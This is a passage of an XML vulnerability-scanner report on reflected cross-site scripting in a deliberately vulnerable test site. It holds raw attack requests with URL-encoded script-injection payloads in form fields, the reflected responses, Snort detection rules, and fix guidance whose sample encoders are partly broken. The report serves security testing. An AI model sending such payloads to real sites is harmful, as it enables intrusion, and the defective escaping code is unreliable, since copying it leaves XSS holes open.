</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="DE30DF538438A1200688B1CFCA1F594F"><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="DE30DF538438A1200688B1CFCA1F594F";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uemail";AttackParamIndex="5";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="John.Doe%2540somewhere.com%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2533%2534%2531%2537%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="fa9f6234";
X-Request-Memo: ID="85a7fcb1";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%33%34%31%37%31%29%3c%2f%73%43%72%49%70%54%3e&uphone=770&uaddress=1707%20Interdimensional%20Street&signup=signup]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:52:57 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 811

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com<sCrIpT>alert(34171)</sCrIpT></li><li>Phone number: 770</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></RawResponse><Request id="DE30DF538438A1200688B1CFCA1F594F"><Method>POST</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uuname=12345&amp;upass=foo&amp;upass2=foo&amp;urname=12345&amp;ucc=12345&amp;uemail=John.Doe%40somewhere.com%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%33%34%31%37%31%29%3c%2f%73%43%72%49%70%54%3e&amp;uphone=770&amp;uaddress=1707%20Interdimensional%20Street&amp;signup=signup</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>242</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="DE30DF538438A1200688B1CFCA1F594F";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uemail";AttackParamIndex="5";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="John.Doe%2540somewhere.com%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2533%2534%2531%2537%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="fa9f6234";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="85a7fcb1";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com<sCrIpT>alert(34171)</sCrIpT></li><li>Phone number: 770</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:52:57 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>811</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="D1A1C5D0E865E1A0D106EA9777487F32"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>uphone</AttackParamDescriptor><Issues><Issue id="a1b1f46a-0d3b-48b9-b0e7-9115c593f060"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="D1A1C5D0E865E1A0D106EA9777487F32";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uphone";AttackParamIndex="6";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="770%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2531%2538%2535%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="b925d3bb";
X-Request-Memo: ID="5cd6561b";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=770%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%31%38%35%31%29%3c%2f%73%43%72%49%70%54%3e&uaddress=1707%20Interdimensional%20Street&signup=signup]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="922" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

